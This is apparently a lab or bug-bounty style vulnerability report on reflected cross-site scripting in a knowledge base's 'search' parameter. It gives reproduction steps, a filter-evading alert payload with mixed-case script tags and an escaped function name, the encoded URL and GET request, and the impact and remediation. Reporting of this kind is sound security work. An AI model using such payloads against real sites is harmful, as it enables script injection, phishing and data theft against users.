## Title
Reflected XSS - Knowledge Base Search

## Description
The Knowledge Base search functionality accepts user-controlled input through the `search` GET parameter. During testing, a crafted JavaScript payload was reflected and executed in the browser, triggering a JavaScript alert displaying `XSS`.

This demonstrates a Reflected Cross-Site Scripting (XSS) vulnerability in the search functionality.

**Affected URL:** https://kb.pwnedbox.site/
**HTTP Method:** GET
**Affected Parameter:** `search`

## Steps to Reproduce
1. Open `https://kb.pwnedbox.site/`.
2. Enter the crafted payload into the search field.
3. Click the Search button.
4. Observe the JavaScript alert displaying `XSS`.

## POC (Proof of Concept)
**Lab Address:** https://kb.pwnedbox.site/

**HTTP Method:** GET

**Vulnerable Parameter:** `search`

**Payload:**
```html
mihir'"><ScRiPt>\u0061lert("XSS")</ScRiPt>
```

**Crafted URL:**
```text
https://kb.pwnedbox.site/?search=mihir%27%22%3CScRiPt%3E%5Cu0061lert%28%22XSS%22%29%3C%2FScRiPt%3E
```

**Request Parameter:**
```http
GET /?search=mihir%27%22%3CScRiPt%3E%5Cu0061lert%28%22XSS%22%29%3C%2FScRiPt%3E HTTP/1.1
Host: kb.pwnedbox.site
```

**Observed Result:**

The application processes the crafted search input, and the injected JavaScript executes in the browser. A JavaScript alert displaying `XSS` appears, confirming successful reflected JavaScript execution.

**Screenshot Evidence:**
1. Search page with the crafted payload entered in the search field.
   <img width="1919" height="964" alt="image" src="https://github.com/user-attachments/assets/04081554-2802-4870-a142-764e45c25963" />


2. JavaScript alert displaying `XSS` after submitting the search.
   <img width="1916" height="986" alt="image" src="https://github.com/user-attachments/assets/c13d3b2c-1da1-46db-b35e-10fcd32daca9" />

4. Search results page after dismissing the alert.
   <img width="1919" height="990" alt="image" src="https://github.com/user-attachments/assets/535687e7-c2f0-45fa-9ef3-46a7abdddb04" />


## Impact
An attacker could craft a malicious URL and trick a victim into opening it. Successful exploitation may allow:

- Execution of attacker-controlled JavaScript in the victim's browser.
- Manipulation of page content and user interface.
- Phishing through injected content.
- Potential access to data available to scripts in the affected page, depending on browser and application security controls.

## Remediation
1. Apply context-aware output encoding to all user-controlled search input before rendering it.
2. Avoid inserting untrusted input directly into HTML.
3. Implement a restrictive Content Security Policy (CSP) as an additional security layer.
4. Validate and safely handle user-supplied search parameters.
